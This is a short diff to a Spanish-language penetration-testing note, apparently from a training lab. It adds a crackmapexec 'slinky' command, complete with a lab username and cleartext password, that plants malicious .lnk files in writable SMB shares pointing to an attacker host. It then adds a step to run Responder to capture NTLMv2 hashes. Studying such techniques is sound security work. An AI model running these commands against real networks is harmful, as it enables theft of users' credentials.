@@ -1,4 +1,12 @@
-### Info
+# Con crackmapexec
+
+Podemos aprovechar el modulo slinky para crear de manera automática un lnk en todas las carpetas de la red en las que nuestro usuario tenga permiso de escritura
+
+    crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.33 NAME=important
+
+Luego corremos responder
+
+# Manual
 
 Si podemos subir un archivo a una carpeta smb, podemos crear un falso lnk que nos permita aprovechar a responder para envenenar el tráfico ntlmv2 
 
